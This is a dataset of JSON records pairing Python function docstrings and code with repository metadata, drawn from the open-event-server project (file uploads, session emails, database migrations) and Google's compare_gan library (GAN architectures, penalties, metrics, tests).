{"docstring": "\"\"\"\nUpload handler\n\"\"\"\n# refresh settings\n", "func_signal": "def upload(uploaded_file, key, **kwargs):\n", "code": "aws_bucket_name = get_settings()['aws_bucket_name']\naws_key = get_settings()['aws_key']\naws_secret = get_settings()['aws_secret']\naws_region = get_settings()['aws_region']\n\ngs_bucket_name = get_settings()['gs_bucket_name']\ngs_key = get_settings()['gs_key']\ngs_secret = get_settings()['gs_secret']\n\nstorage_place = get_settings()['storage_place']\n\n# upload\nif aws_bucket_name and aws_key and aws_secret and storage_place == 's3':\n    return upload_to_aws(aws_bucket_name, aws_region, aws_key, aws_secret, uploaded_file, key, **kwargs)\nelif gs_bucket_name and gs_key and gs_secret and storage_place == 'gs':\n    return upload_to_gs(gs_bucket_name, gs_key, gs_secret, uploaded_file, key, **kwargs)\nelse:\n    return upload_local(uploaded_file, key, **kwargs)", "path": "open-event-server/app/api/helpers/storage.py", "commit_date": "2017-08-14 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.drop_table('sessions_speakers')\nop.add_column('user', sa.Column('created_date', sa.DateTime(), nullable=True))\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/5aea50727992_.py", "commit_date": "2016-06-20 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nUploads file locally. Base dir - static/media/\n\"\"\"\n", "func_signal": "def upload_local(uploaded_file, key, **kwargs):\n", "code": "filename = secure_filename(uploaded_file.filename)\nfile_relative_path = 'static/media/' + key + '/' + generate_hash(key) + '/' + filename\nfile_path = app.config['BASE_DIR'] + '/' + file_relative_path\ndir_path = file_path.rsplit('/', 1)[0]\n# delete current\ntry:\n    rmtree(dir_path)\nexcept OSError:\n    pass\n# create dirs\nif not os.path.isdir(dir_path):\n    os.makedirs(dir_path)\nuploaded_file.save(file_path)\nfile_relative_path = '/' + file_relative_path\nif get_settings()['static_domain']:\n    return get_settings()['static_domain'] + \\\n        file_relative_path.replace('/static', '')\nurl = urlparse(request.url)\nreturn url.scheme + '://' + url.hostname + file_relative_path", "path": "open-event-server/app/api/helpers/storage.py", "commit_date": "2017-08-14 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nmethod to send email for creation of new session\nmails session link to the concerned user\n:param session:\n:param data:\n:param view_kwargs:\n:return:\n\"\"\"\n", "func_signal": "def after_create_object(self, session, data, view_kwargs):\n", "code": "if session.event.get_organizer():\n    event_name = session.event.name\n    organizer = session.event.get_organizer()\n    organizer_email = organizer.email\n    frontend_url = get_settings()['frontend_url']\n    link = \"{}/events/{}/sessions/{}\"\\\n        .format(frontend_url, session.event_id, session.id)\n    send_email_new_session(organizer_email, event_name, link)\n    send_notif_new_session_organizer(organizer, event_name, link)", "path": "open-event-server/app/api/sessions.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\" Send email if session accepted or rejected \"\"\"\n", "func_signal": "def after_update_object(self, session, data, view_kwargs):\n", "code": "if 'state' in data and (session.state == 'accepted' or session.state == 'rejected'):\n    # Email for speaker\n    speakers = session.speakers\n    for speaker in speakers:\n        frontend_url = get_settings()['frontend_url']\n        link = \"{}/events/{}/sessions/{}\" \\\n            .format(frontend_url, session.event_id, session.id)\n        send_email_session_accept_reject(speaker.email, session, link)\n        send_notif_session_accept_reject(speaker, session.title, session.state, link)\n\n    # Email for organizer\n    if session.event.get_organizer():\n        organizer = session.event.get_organizer()\n        organizer_email = organizer.email\n        frontend_url = get_settings()['frontend_url']\n        link = \"{}/events/{}/sessions/{}\" \\\n            .format(frontend_url, session.event_id, session.id)\n        send_email_session_accept_reject(organizer_email, session,\n                                         link)\n        send_notif_session_accept_reject(organizer, session.title,\n                                         session.state, link)", "path": "open-event-server/app/api/sessions.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nquery method for SessionList class\n:param view_kwargs:\n:return:\n\"\"\"\n", "func_signal": "def query(self, view_kwargs):\n", "code": "query_ = self.session.query(Session)\nif view_kwargs.get('track_id') is not None:\n    track = safe_query(self, Track, 'id', view_kwargs['track_id'], 'track_id')\n    query_ = query_.join(Track).filter(Track.id == track.id)\nif view_kwargs.get('session_type_id') is not None:\n    session_type = safe_query(self, SessionType, 'id', view_kwargs['session_type_id'], 'session_type_id')\n    query_ = query_.join(SessionType).filter(SessionType.id == session_type.id)\nif view_kwargs.get('microlocation_id') is not None:\n    microlocation = safe_query(self, Microlocation, 'id', view_kwargs['microlocation_id'], 'microlocation_id')\n    query_ = query_.join(Microlocation).filter(Microlocation.id == microlocation.id)\nif view_kwargs.get('user_id') is not None:\n    user = safe_query(self, User, 'id', view_kwargs['user_id'], 'user_id')\n    query_ = query_.join(User).filter(User.id == user.id)\nquery_ = event_query(self, query_, view_kwargs)\nif view_kwargs.get('speaker_id'):\n    speaker = safe_query(self, Speaker, 'id', view_kwargs['speaker_id'], 'speaker_id')\n    # session-speaker :: many-to-many relationship\n    query_ = Session.query.filter(Session.speakers.any(id=speaker.id))\n\nreturn query_", "path": "open-event-server/app/api/sessions.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_column('ticket_holders', 'work_phone')\nop.drop_column('ticket_holders', 'work_address')\nop.drop_column('ticket_holders', 'website')\nop.drop_column('ticket_holders', 'twitter')\nop.drop_column('ticket_holders', 'tax_business_info')\nop.drop_column('ticket_holders', 'shipping_address')\nop.drop_column('ticket_holders', 'phone')\nop.drop_column('ticket_holders', 'job_title')\nop.drop_column('ticket_holders', 'home_address')\nop.drop_column('ticket_holders', 'github')\nop.drop_column('ticket_holders', 'gender')\nop.drop_column('ticket_holders', 'facebook')\nop.drop_column('ticket_holders', 'company')\nop.drop_column('ticket_holders', 'blog')\nop.drop_column('ticket_holders', 'birth_date')\nop.drop_column('ticket_holders', 'billing_address')\n# ### end Alembic commands ###", "path": "open-event-server/migrations/versions/b4fdb245fccd_.py", "commit_date": "2017-08-22 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_column('user', 'created_date')\nop.create_table('sessions_speakers',\nsa.Column('id', sa.INTEGER(), nullable=False),\nsa.Column('speaker_id', sa.INTEGER(), autoincrement=False, nullable=True),\nsa.Column('session_id', sa.INTEGER(), autoincrement=False, nullable=True),\nsa.ForeignKeyConstraint(['session_id'], [u'session.id'], name=u'sessions_speakers_session_id_fkey'),\nsa.ForeignKeyConstraint(['speaker_id'], [u'speaker.id'], name=u'sessions_speakers_speaker_id_fkey'),\nsa.PrimaryKeyConstraint('id', name=u'sessions_speakers_pkey')\n)\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/5aea50727992_.py", "commit_date": "2016-06-20 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nUploads to AWS at key\nhttp://{bucket}.s3.amazonaws.com/{key}\n\"\"\"\n\n", "func_signal": "def upload_to_aws(bucket_name, aws_region, aws_key, aws_secret, file, key, acl='public-read'):\n", "code": "if '.' in bucket_name and aws_region and aws_region != '':\n    conn = boto.s3.connect_to_region(\n        aws_region,\n        aws_access_key_id=aws_key,\n        aws_secret_access_key=aws_secret,\n        calling_format=OrdinaryCallingFormat()\n    )\nelse:\n    conn = S3Connection(aws_key, aws_secret)\n\nbucket = conn.get_bucket(bucket_name)\nk = Key(bucket)\n# generate key\nfilename = secure_filename(file.filename)\nkey_dir = key + '/' + generate_hash(key) + '/'\nk.key = key_dir + filename\n# delete old data\nfor item in bucket.list(prefix='/' + key_dir):\n    item.delete()\n# set object settings\n\nfile_data = file.read()\nfile_mime = magic.from_buffer(file_data, mime=True)\nsize = len(file_data)\nsent = k.set_contents_from_string(\n    file_data,\n    headers={\n        'Content-Disposition': 'attachment; filename=%s' % filename,\n        'Content-Type': '%s' % file_mime\n    }\n)\nk.set_acl(acl)\ns3_url = 'https://%s.s3.amazonaws.com/' % bucket_name\nif sent == size:\n    return s3_url + k.key\nreturn False", "path": "open-event-server/app/api/helpers/storage.py", "commit_date": "2017-08-14 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_column('speaker', 'thumbnail')\nop.drop_column('speaker', 'small')\nop.drop_column('speaker', 'icon')\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/79e54124b415_.py", "commit_date": "2016-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.add_column('speaker', sa.Column('icon', sa.String(), nullable=True))\nop.add_column('speaker', sa.Column('small', sa.String(), nullable=True))\nop.add_column('speaker', sa.Column('thumbnail', sa.String(), nullable=True))\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/79e54124b415_.py", "commit_date": "2016-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.add_column('ticket_holders', sa.Column('billing_address', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('birth_date', sa.DateTime(timezone=True), nullable=True))\nop.add_column('ticket_holders', sa.Column('blog', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('company', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('facebook', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('gender', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('github', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('home_address', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('job_title', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('phone', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('shipping_address', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('tax_business_info', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('twitter', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('website', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('work_address', sa.String(), nullable=True))\nop.add_column('ticket_holders', sa.Column('work_phone', sa.String(), nullable=True))\n# ### end Alembic commands ###", "path": "open-event-server/migrations/versions/b4fdb245fccd_.py", "commit_date": "2017-08-22 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "# Construct input for batch norm tests:\n# 4 images with resolution 2x1 and 3 channels.\n", "func_signal": "def setUp(self):\n", "code": "x1 = np.asarray([[[5, 7, 2]], [[5, 8, 8]]], dtype=np.float32)\nx2 = np.asarray([[[1, 2, 0]], [[4, 0, 4]]], dtype=np.float32)\nx3 = np.asarray([[[6, 2, 6]], [[5, 0, 5]]], dtype=np.float32)\nx4 = np.asarray([[[2, 4, 2]], [[6, 4, 1]]], dtype=np.float32)\nself._inputs = np.stack([x1, x2, x3, x4])\nself.assertAllEqual(self._inputs.shape, [4, 2, 1, 3])\n# And the expected output for applying batch norm (without additional\n# scaling/shifting).\nself._expected_outputs = np.asarray(\n    [[[[0.4375205, 1.30336881, -0.58830315]],\n      [[0.4375205, 1.66291881, 1.76490951]]],\n     [[[-1.89592218, -0.49438119, -1.37270737]],\n      [[-0.14584017, -1.21348119, 0.19610107]]],\n     [[[1.02088118, -0.49438119, 0.98050523]],\n      [[0.4375205, -1.21348119, 0.58830321]]],\n     [[[-1.31256151, 0.22471881, -0.58830315]],\n      [[1.02088118, 0.22471881, -0.98050523]]]],\n    dtype=np.float32)\nself.assertAllEqual(self._expected_outputs.shape, [4, 2, 1, 3])", "path": "compare_gan/compare_gan/architectures/arch_ops_tpu_test.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "# Mismatch in number of samples with enforce_balance set to True\n", "func_signal": "def test_compute_prd_from_embedding_mismatch_num_samples_should_fail(self):\n", "code": "with self.assertRaises(ValueError):\n  prd.compute_prd_from_embedding(\n      np.array([[0], [0], [1]]), np.array([[0], [1]]), num_clusters=2,\n      enforce_balance=True)", "path": "compare_gan/compare_gan/metrics/prd_score_test.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Returns the DRAGAN gradient penalty.\n\nArgs:\n  discriminator: Instance of `AbstractDiscriminator`.\n  x: Samples from the true distribution, shape [bs, h, w, channels].\n  y: Encoded class embedding for the samples. None for unsupervised models.\n  is_training: boolean, are we in train or eval model.\n\nReturns:\n  A tensor with the computed penalty.\n\"\"\"\n", "func_signal": "def dragan_penalty(discriminator, x, y, is_training):\n", "code": "with tf.name_scope(\"dragan_penalty\"):\n  _, var = tf.nn.moments(x, axes=list(range(len(x.get_shape()))))\n  std = tf.sqrt(var)\n  x_noisy = x + std * (ops.random_uniform(x.shape) - 0.5)\n  x_noisy = tf.clip_by_value(x_noisy, 0.0, 1.0)\n  logits = discriminator(x_noisy, y=y, is_training=is_training, reuse=True)[1]\n  gradients = tf.gradients(logits, [x_noisy])[0]\n  slopes = tf.sqrt(0.0001 + tf.reduce_sum(\n      tf.square(gradients), reduction_indices=[1, 2, 3]))\n  gradient_penalty = tf.reduce_mean(tf.square(slopes - 1.0))\n  return gradient_penalty", "path": "compare_gan/compare_gan/gans/penalty_lib.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Apply the discriminator on a input.\n\nArgs:\n  x: `Tensor` of shape [batch_size, ?, ?, ?] with real or fake images.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: Boolean, whether the architecture should be constructed for\n    training or inference.\n\nReturns:\n  Tuple of 3 Tensors, the final prediction of the discriminator, the logits\n  before the final output activation function and logits form the second\n  last layer.\n\"\"\"\n", "func_signal": "def apply(self, x, y, is_training):\n", "code": "resnet_ops.validate_image_inputs(x)\ncolors = x.shape[3].value\nif colors not in [1, 3]:\n  raise ValueError(\"Number of color channels not supported: {}\".format(\n      colors))\n\nblock = self._resnet_block(\n    name=\"B0\",\n    in_channels=colors,\n    out_channels=self._ch,\n    scale=\"down\")\noutput = block(x, z=None, y=y, is_training=is_training)\n\nfor block_idx in range(5):\n  block = self._resnet_block(\n      name=\"B{}\".format(block_idx + 1),\n      in_channels=self._ch * self._channels[block_idx],\n      out_channels=self._ch * self._channels[block_idx + 1],\n      scale=\"down\")\n  output = block(output, z=None, y=y, is_training=is_training)\n\noutput = tf.nn.relu(output)\npre_logits = tf.reduce_mean(output, axis=[1, 2])\nout_logit = ops.linear(pre_logits, 1, scope=\"disc_final_fc\",\n                       use_sn=self._spectral_norm)\nout = tf.nn.sigmoid(out_logit)\nreturn out, out_logit, pre_logits", "path": "compare_gan/compare_gan/architectures/resnet5.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Returns the WGAN gradient penalty.\n\nArgs:\n  discriminator: Instance of `AbstractDiscriminator`.\n  x: samples from the true distribution, shape [bs, h, w, channels].\n  x_fake: samples from the fake distribution, shape [bs, h, w, channels].\n  y: Encoded class embedding for the samples. None for unsupervised models.\n  is_training: boolean, are we in train or eval model.\n\nReturns:\n  A tensor with the computed penalty.\n\"\"\"\n", "func_signal": "def wgangp_penalty(discriminator, x, x_fake, y, is_training):\n", "code": "with tf.name_scope(\"wgangp_penalty\"):\n  alpha = ops.random_uniform(shape=[x.shape[0].value, 1, 1, 1], name=\"alpha\")\n  interpolates = x + alpha * (x_fake - x)\n  logits = discriminator(\n      interpolates, y=y, is_training=is_training, reuse=True)[1]\n  gradients = tf.gradients(logits, [interpolates])[0]\n  slopes = tf.sqrt(0.0001 + tf.reduce_sum(\n      tf.square(gradients), reduction_indices=[1, 2, 3]))\n  gradient_penalty = tf.reduce_mean(tf.square(slopes - 1.0))\n  return gradient_penalty", "path": "compare_gan/compare_gan/gans/penalty_lib.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Checks if two image tensors are compatible for metric computation.\n\nThis function checks if two sets of images have ranks at least 3, and if the\nlast three dimensions match.\n\nArgs:\n  img1: The first images tensor.\n  img2: The second images tensor.\n\nReturns:\n  A tuple of the first tensor shape, the second tensor shape, and a list of\n  tf.Assert() implementing the checks.\n\nRaises:\n  ValueError: when static shape check fails.\n\"\"\"\n", "func_signal": "def verify_compatible_shapes(img1, img2):\n", "code": "shape1 = img1.get_shape().with_rank_at_least(3)\nshape2 = img2.get_shape().with_rank_at_least(3)\nshape1[-3:].assert_is_compatible_with(shape2[-3:])\n\nif shape1.ndims is not None and shape2.ndims is not None:\n  for dim1, dim2 in zip(reversed(shape1[:-3]), reversed(shape2[:-3])):\n    if not (dim1 == 1 or dim2 == 1 or dim1.is_compatible_with(dim2)):\n      raise ValueError(\n          'Two images are not compatible: %s and %s' % (shape1, shape2))\n\n# Now assign shape tensors.\nshape1, shape2 = tf.shape_n([img1, img2])\n\nchecks = []\nchecks.append(tf.Assert(tf.greater_equal(tf.size(shape1), 3),\n                        [shape1, shape2], summarize=10))\nchecks.append(tf.Assert(tf.reduce_all(tf.equal(shape1[-3:], shape2[-3:])),\n                        [shape1, shape2], summarize=10))\nreturn shape1, shape2, checks", "path": "compare_gan/compare_gan/metrics/image_similarity.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Function to mimic the 'fspecial' gaussian MATLAB function.\"\"\"\n", "func_signal": "def f_special_gauss(size, sigma):\n", "code": "size = tf.convert_to_tensor(size, tf.int32)\nsigma = tf.convert_to_tensor(sigma)\n\ncoords = tf.cast(tf.range(size), sigma.dtype)\ncoords -= tf.cast(size - 1, sigma.dtype) / 2.0\n\ng = tf.square(coords)\ng *= -0.5 / tf.square(sigma)\n\ng = tf.reshape(g, shape=[1, -1]) + tf.reshape(g, shape=[-1, 1])\ng = tf.reshape(g, shape=[1, -1])  # For tf.nn.softmax().\ng = tf.nn.softmax(g)\nreturn tf.reshape(g, shape=[size, size, 1, 1])", "path": "compare_gan/compare_gan/metrics/image_similarity.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Build the generator network for the given inputs.\n\nArgs:\n  z: `Tensor` of shape [batch_size, z_dim] with latent code.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: boolean, are we in train or eval model.\n\nReturns:\n  A tensor of size [batch_size] + self._image_shape with values in [0, 1].\n\"\"\"\n", "func_signal": "def apply(self, z, y, is_training):\n", "code": "del y\nh, w, c = self._image_shape\nbs = z.shape.as_list()[0]\nnet = linear(z, 1024, scope=\"g_fc1\")\nnet = lrelu(batch_norm(net, is_training=is_training, name=\"g_bn1\"))\nnet = linear(net, 128 * (h // 4) * (w // 4), scope=\"g_fc2\")\nnet = lrelu(batch_norm(net, is_training=is_training, name=\"g_bn2\"))\nnet = tf.reshape(net, [bs, h // 4, w // 4, 128])\nnet = deconv2d(net, [bs, h // 2, w // 2, 64], 4, 4, 2, 2, name=\"g_dc3\")\nnet = lrelu(batch_norm(net, is_training=is_training, name=\"g_bn3\"))\nnet = deconv2d(net, [bs, h, w, c], 4, 4, 2, 2, name=\"g_dc4\")\nout = tf.nn.sigmoid(net)\nreturn out", "path": "compare_gan/compare_gan/architectures/infogan.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Build the generator network for the given inputs.\n\nArgs:\n  z: `Tensor` of shape [batch_size, z_dim] with latent code.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: boolean, are we in train or eval model.\n\nReturns:\n  A tensor of size [batch_size] + self._image_shape with values in [0, 1].\n\"\"\"\n", "func_signal": "def apply(self, z, y, is_training):\n", "code": "shape_or_none = lambda t: None if t is None else t.shape\nlogging.info(\"[Generator] inputs are z=%s, y=%s\", z.shape, shape_or_none(y))\n# Each block upscales by a factor of 2.\nseed_size = 4\nz_dim = z.shape[1].value\n\nin_channels, out_channels = self._get_in_out_channels()\nnum_blocks = len(in_channels)\n\nif self._embed_z:\n  z = ops.linear(z, z_dim, scope=\"embed_z\", use_sn=False,\n                 use_bias=self._embed_bias)\nif self._embed_y:\n  y = ops.linear(y, self._embed_y_dim, scope=\"embed_y\", use_sn=False,\n                 use_bias=self._embed_bias)\ny_per_block = num_blocks * [y]\nif self._hierarchical_z:\n  z_per_block = tf.split(z, num_blocks + 1, axis=1)\n  z0, z_per_block = z_per_block[0], z_per_block[1:]\n  if y is not None:\n    y_per_block = [tf.concat([zi, y], 1) for zi in z_per_block]\nelse:\n  z0 = z\n  z_per_block = num_blocks * [z]\n\nlogging.info(\"[Generator] z0=%s, z_per_block=%s, y_per_block=%s\",\n             z0.shape, [str(shape_or_none(t)) for t in z_per_block],\n             [str(shape_or_none(t)) for t in y_per_block])\n\n# Map noise to the actual seed.\nnet = ops.linear(\n    z0,\n    in_channels[0] * seed_size * seed_size,\n    scope=\"fc_noise\",\n    use_sn=self._spectral_norm)\n# Reshape the seed to be a rank-4 Tensor.\nnet = tf.reshape(\n    net,\n    [-1, seed_size, seed_size, in_channels[0]],\n    name=\"fc_reshaped\")\n\nfor block_idx in range(num_blocks):\n  name = \"B{}\".format(block_idx + 1)\n  block = self._resnet_block(\n      name=name,\n      in_channels=in_channels[block_idx],\n      out_channels=out_channels[block_idx],\n      scale=\"up\")\n  net = block(\n      net,\n      z=z_per_block[block_idx],\n      y=y_per_block[block_idx],\n      is_training=is_training)\n  if name in self._blocks_with_attention:\n    logging.info(\"[Generator] Applying non-local block to %s\", net.shape)\n    net = ops.non_local_block(net, \"non_local_block\",\n                              use_sn=self._spectral_norm)\n# Final processing of the net.\n# Use unconditional batch norm.\nlogging.info(\"[Generator] before final processing: %s\", net.shape)\nnet = ops.batch_norm(net, is_training=is_training, name=\"final_norm\")\nnet = tf.nn.relu(net)\nnet = ops.conv2d(net, output_dim=self._image_shape[2], k_h=3, k_w=3,\n                 d_h=1, d_w=1, name=\"final_conv\",\n                 use_sn=self._spectral_norm)\nlogging.info(\"[Generator] after final processing: %s\", net.shape)\nnet = (tf.nn.tanh(net) + 1.0) / 2.0\nreturn net", "path": "compare_gan/compare_gan/architectures/resnet_biggan.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Computes the inception features and logits for a given NumPy array.\n\nThe inputs are first preprocessed to match the input shape required for\nInception.\n\nArgs:\n  inputs: NumPy array of shape [-1, H, W, 3].\n  batch_size: Batch size.\n\nReturns:\n  A tuple of NumPy arrays with Inception features and logits for each input.\n\"\"\"\n", "func_signal": "def inception_transform_np(inputs, batch_size):\n", "code": "with tf.Session(graph=tf.Graph()) as sess:\n  inputs_placeholder = tf.placeholder(\n      dtype=tf.float32, shape=[None] + list(inputs[0].shape))\n  features_and_logits = inception_transform(inputs_placeholder)\n  features = []\n  logits = []\n  num_batches = int(np.ceil(inputs.shape[0] / batch_size))\n  for i in range(num_batches):\n    input_batch = inputs[i * batch_size:(i + 1) * batch_size]\n    x = sess.run(\n        features_and_logits, feed_dict={inputs_placeholder: input_batch})\n    features.append(x[0])\n    logits.append(x[1])\n  features = np.vstack(features)\n  logits = np.vstack(logits)\n  return features, logits", "path": "compare_gan/compare_gan/eval_utils.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "# Mismatch in number of samples with enforce_balance set to False\n", "func_signal": "def test_compute_prd_from_embedding_mismatch_num_samples_should_work(self):\n", "code": "try:\n  prd.compute_prd_from_embedding(\n      np.array([[0], [0], [1]]), np.array([[0], [1]]), num_clusters=2,\n      enforce_balance=False)\nexcept ValueError:\n  self.fail(\n      'compute_prd_from_embedding should not raise a ValueError when '\n      'enforce_balance is set to False.')", "path": "compare_gan/compare_gan/metrics/prd_score_test.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"\"ResNet block containing possible down/up sampling, shared for G / D.\n\nArgs:\n  inputs: a 3d input tensor of feature map.\n  z: the latent vector for potential self-modulation. Can be None if use_sbn\n    is set to False.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: boolean, whether or notthis is called during the training.\n\nReturns:\n  output: a 3d output tensor of feature map.\n\"\"\"\n", "func_signal": "def apply(self, inputs, z, y, is_training):\n", "code": "if inputs.shape[-1].value != self._in_channels:\n  raise ValueError(\n      \"Unexpected number of input channels (expected {}, got {}).\".format(\n          self._in_channels, inputs.shape[-1].value))\n\nwith tf.variable_scope(self._name, values=[inputs]):\n  outputs = inputs\n\n  outputs = self.batch_norm(\n      outputs, z=z, y=y, is_training=is_training, name=\"bn1\")\n  if self._layer_norm:\n    outputs = ops.layer_norm(outputs, is_training=is_training, scope=\"ln1\")\n\n  outputs = tf.nn.relu(outputs)\n  outputs = self._get_conv(\n      outputs, self._in_channels, self._out_channels, self._scale1,\n      suffix=\"conv1\")\n\n  outputs = self.batch_norm(\n      outputs, z=z, y=y, is_training=is_training, name=\"bn2\")\n  if self._layer_norm:\n    outputs = ops.layer_norm(outputs, is_training=is_training, scope=\"ln2\")\n\n  outputs = tf.nn.relu(outputs)\n  outputs = self._get_conv(\n      outputs, self._out_channels, self._out_channels, self._scale2,\n      suffix=\"conv2\")\n\n  # Combine skip-connection with the convolved part.\n  if self._add_shortcut:\n    shortcut = self._get_conv(\n        inputs, self._in_channels, self._out_channels, self._scale,\n        kernel_size=(1, 1),\n        suffix=\"conv_shortcut\")\n    outputs += shortcut\n  logging.info(\"[Block] %s (z=%s, y=%s) -> %s\", inputs.shape,\n               None if z is None else z.shape,\n               None if y is None else y.shape, outputs.shape)\n  return outputs", "path": "compare_gan/compare_gan/architectures/resnet_biggan.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Returns a generated data set as a NumPy array.\"\"\"\n", "func_signal": "def sample_fake_dataset(sess, generator, num_batches):\n", "code": "logging.info(\"Generating a fake data set.\")\nsamples = []\nfor _ in range(num_batches):\n  x = sess.run(generator)\n  # If NaNs were generated, ignore this checkpoint and assign a very high\n  # FID score which we handle specially later.\n  if np.isnan(x).any():\n    logging.error(\"Detected NaN in fake_images! Returning NaN.\")\n    raise NanFoundError(\"Detected NaN in fake images.\")\n  samples.append(x)\nfake_images = np.concatenate(samples, axis=0)\nfake_images *= 255.0\n# Convert 1-channel datasets (like MNIST) to 3 channels.\nif fake_images.shape[3] == 1:\n  fake_images = np.tile(fake_images, [1, 1, 1, 3])\nlogging.info(\"Done sampling a generated data set.\")\nreturn fake_images", "path": "compare_gan/compare_gan/eval_utils.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"ResNet block for the generator.\"\"\"\n", "func_signal": "def _resnet_block(self, name, in_channels, out_channels, scale):\n", "code": "if scale not in [\"down\", \"none\"]:\n  raise ValueError(\n      \"Unknown discriminator ResNet block scaling: {}.\".format(scale))\nreturn BigGanResNetBlock(\n    name=name,\n    in_channels=in_channels,\n    out_channels=out_channels,\n    scale=scale,\n    is_gen_block=False,\n    add_shortcut=in_channels != out_channels,\n    layer_norm=self._layer_norm,\n    spectral_norm=self._spectral_norm,\n    batch_norm=self.batch_norm)", "path": "compare_gan/compare_gan/architectures/resnet_biggan.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
